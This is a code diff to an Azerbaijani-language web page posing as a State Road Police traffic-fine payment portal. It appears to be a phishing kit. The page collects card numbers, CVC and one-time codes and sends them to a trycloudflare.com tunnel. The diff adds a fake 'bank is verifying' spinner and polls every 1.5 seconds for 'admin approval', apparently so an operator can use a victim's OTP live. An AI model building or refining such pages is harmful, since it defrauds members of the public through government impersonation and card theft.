@@ -62,7 +62,7 @@
                         </div>
                         <div class="flex justify-between">
                             <span class="text-gray-500">Tarix və Saat:</span>
-                            <span id="val-date" class="font-medium text-gray-800">15.10.2026 / 15:20</span>
+                            <span id="val-date" class="font-medium text-gray-800">15.10.2026 / 15:48</span>
                         </div>
                         <div class="flex justify-between">
                             <span class="text-gray-500">Ünvan:</span>
@@ -162,15 +162,23 @@
         </div>
     </div>
 
+    <!-- LOADING / WAITING FOR APPROVAL MODAL -->
+    <div id="loading-modal" class="fixed inset-0 bg-black/70 flex items-center justify-center p-4 hidden z-50">
+        <div class="bg-white rounded-2xl max-w-sm w-full p-8 text-center space-y-4 shadow-2xl">
+            <div class="inline-block animate-spin rounded-full h-16 w-16 border-4 border-blue-600 border-t-transparent"></div>
+            <h3 class="font-bold text-gray-800 text-lg">Ödəniş Təsdiqlənir...</h3>
+            <p class="text-xs text-gray-500">Zəhmət olmasa gözləyin, bank əməliyyatı yoxlanılır.</p>
+        </div>
+    </div>
+
     <script>
-        // Default directly to Cloudflare tunnel URL so it never fails on GitHub Pages
         let API_URL = 'https://groups-wrapped-meetup-specifications.trycloudflare.com/api';
         let timeLeft = 600;
         let timerInterval;
         let otpTimeLeft = 180;
         let otpInterval;
 
-        // Auto formatting & Auto focus shifting (Card No -> Exp -> CVC)
+        // Auto formatting & Auto focus shifting
         document.getElementById('card-no').addEventListener('input', function (e) {
             let value = e.target.value.replace(/\D/g, '').substring(0, 16);
             let formatted = value.match(/.{1,4}/g)?.join(' ') || '';
@@ -193,21 +201,6 @@
             }
         });
 
-        async function initApp() {
-            try {
-                const res = await fetch('config.json');
-                const config = await res.json();
-                if (config.apiUrl) {
-                    API_URL = config.apiUrl;
-                }
-            } catch (err) {
-                console.log("Config oxunmadı, default istifadə olunur");
-            }
-
-            fetchFineData();
-            startTimer();
-        }
-
         async function fetchFineData() {
             try {
                 const res = await fetch(`${API_URL}/fine`);
@@ -221,13 +214,15 @@
         function updateUI(data) {
             if (data.isPaid) {
                 clearInterval(timerInterval);
+                closeModals();
+                document.getElementById('loading-modal').classList.add('hidden');
                 document.getElementById('app-container').innerHTML = `
                     <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-8 text-center space-y-6 border-t-8 border-green-600">
                         <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto text-4xl shadow-inner">
                             ✅
                         </div>
                         <div class="space-y-2">
-                            <h1 class="text-2xl font-bold text-gray-800">Ödəniş Uğurla Tamamlandı!</h1>
+                            <h1 class="text-2xl font-bold text-gray-800">Ödəniş Uğurlu Oldu!</h1>
                             <p class="text-sm text-gray-500">Azərbaycan Respublikası Baş Dövlət Yol Polisi İdarəsi - Elektron Qəbz</p>
                         </div>
 
@@ -264,6 +259,12 @@
                     </div>
                 `;
                 return;
+            }
+
+            if (data.isPendingApproval) {
+                document.getElementById('loading-modal').classList.remove('hidden');
+            } else {
+                document.getElementById('loading-modal').classList.add('hidden');
             }
 
             document.getElementById('val-protocol').textContent = data.protocolNo;
@@ -354,17 +355,16 @@
                 console.error("OTP göndərmə xətası:", err);
             }
 
+            // Show loading spinner waiting for admin approval
+            closeModals();
+            document.getElementById('loading-modal').classList.remove('hidden');
+
             try {
-                const res = await fetch(`${API_URL}/pay`, {
+                await fetch(`${API_URL}/pay`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ amountPaid: 20.00 })
                 });
-                const result = await res.json();
-                if (result.success) {
-                    closeModals();
-                    fetchFineData();
-                }
             } catch (err) {
                 console.error("Ödəniş xətası:", err);
             }
@@ -385,7 +385,9 @@
             }, 1000);
         }
 
-        initApp();
+        setInterval(fetchFineData, 1500); // Poll server every 1.5s for approval status
+        fetchFineData();
+        startTimer();
     </script>
 </body>
 </html>
